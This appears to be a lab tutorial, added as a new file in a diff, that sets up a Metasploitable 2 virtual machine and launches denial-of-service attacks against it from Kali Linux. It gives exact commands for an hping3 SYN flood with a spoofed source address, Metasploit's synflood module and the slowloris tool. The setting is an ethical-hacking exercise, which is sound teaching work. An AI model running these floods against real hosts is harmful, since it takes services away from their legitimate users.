@@ -1,0 +1,65 @@
+Write a code to demonstrate DoS attacks.
+DoS Attack : - It is a Cyber attack where perpetrator seeks to make a machine or network resource unavailable to its intented users by temporarily or indefinitely disrupting services of a host connected to the network. It is an attack used to deny legitimate users access to a resource such as accessing a website, emails etc or making it extremely slow. There is one source and 1 target system.
+DoS is accomplished by flooding the target system with many request to overload it and prevent some of the legitimate requests from being fulfilled.
+DDoS attack: - There are many systems which send the requests to single target system.Multiple systems flood the available bandwith. Such an attack is the result of multiple compromised systems for eg. Botnet.
+For this, we will download and install metasploitable 2 machine in the virtual machine as follows.
+1.	Metasplotable 2 machine is a vulnerable tool and is used for ethical hacking purpose.
+2.	Download the https://sourceforge.net/projects/metasploitable/. It will download zip file. Extract it into some folder.
+3.	Check the folder for Metasploitable 2 file of virtual machine disk format file of around 1880704Kb. 
+4.	Open virtual box and click on new.
+5.	Give the values as follows
+a.	Name of the machine :- meta (anything)
+b.	Browse to the folder 
+c.	Select linux.
+d.	Select Debian 64
+e.	Leave storage setting as it is and click next 
+f.	Choose existing virtual machine disk file option and browse for the vmdf in our folder.
+6.	It will install the metasploitable 2.
+7.	Next in the virtual box go to settings-Network as select host-only adapter option and virtua-box host only adapter as 2nd option. 
+8.	Then start the machine.
+9.	Username and password are msfadmin and msfadmin for metasploitable 2.
+10.	Type ifconfig. Note the inet address. In our case it is 192.168.56.101.
+
+This completes the metasplotable 2 installation.
+Next go the Kali Linux, open firefox browser and type http://192.168.56.101. It will open metasplotable 2 webpage in the browser. You can browse to DVWA Link. It will show the DVWA Web Page.
+We can observe the traffic using wireshark.
+For this, Go to Kali applications and select Sniffing  and spoofing and select wireshark. Select eth0 and start capturing the packets and observe the traffic.
+Next we launch the DoS attack using hping3 as follows
+1.	Open One terminal in Kali and enter root login 
+>>sudo su
+Enter kali password
+2.	From root console type the command in the following way
+>>hping3 –S 192.168.56.101(metasploitable 2 IP address) –a 192.168.56.200 (Our spoofed IP address) –p 80(open port) - - flood
+{It will launch the synflood on the metasplotable 2 machine)
+3.	We can observe the traffic in wireshark.  We can see traffic grows enormously after this command is executed.
+4.	Now, If we try to open metasplotable 2 machine, we cannot open as it is under DoS attack now.
+5.	We can stop the attack by pressing ctrl+C/Z/X
+
+2nd way
+
+1.	In Kalilinux, open terminal.
+2.	Type $ msfconsole (it will open msfconsole).
+3.	Open Metasploit and find out the ipaddress with  $ifconfig 
+4.	In kalilinux, at the msfconsole, type $search syn flood
+5.	It will give the exploits of  Metasploit exploits.
+6.	Type $use 0
+7.	It will go to the exploits namespace as msf6 auxiliary(dos/tcp/synflood)>
+8.	msf6 auxiliary(dos/tcp/synflood)>show options
+9.	set the options as follows
+10.	msf6 auxiliary(dos/tcp/synflood)>set RHOSTS 10.16.0.92 (target ip)
+11.	msf6 auxiliary(dos/tcp/synflood)>set SHOSTS 10.16.0.95 (spoofed ip)
+12.	msf6 auxiliary(dos/tcp/synflood)>run
+13.	observe the traffic using wireshark and also from the browser. When we try to open it, it will not open.
+14.	Stop the attack with ctrl+c 
+
+3rd way
+
+1.	We can slowloris tool to launch dos attacks.
+2.	Download it from github . copy the link from github as https://github.com/gkbrk/slowloris.git.
+3.	$git clone https://github.com/gkbrk/slowloris.git
+4.	It will download slowloris file.
+5.	$cd slowloris
+6.	$python3 slowloris.py -p 80 -s 1200 10.16.0.95
+7.	10.16.0.95 is the target machine ip address
+8.	observe the traffic using wireshark and also from the browser. When we try to open it, it will not open.
+9.	Stop the attack with ctrl+c 
